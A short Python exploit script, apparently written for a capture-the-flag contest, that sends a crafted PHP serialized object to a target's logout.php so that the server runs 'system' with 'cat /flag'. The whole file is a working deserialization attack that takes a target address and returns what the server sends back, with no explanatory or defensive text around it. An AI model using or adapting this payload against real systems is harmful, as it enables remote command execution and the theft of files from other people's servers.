import requests

def attack(target):
    # throws exception
    x = requests.post('http://'+target+'/login/logout.php?x=1', data={
        'un': 'O:1:"A":2:{s:4:"name";s:6:"system";s:4:"male";s:9:"cat /flag";}'
    }).text
    chall_id = target.split(':')[1][0]
    return chall_id+"\\"+x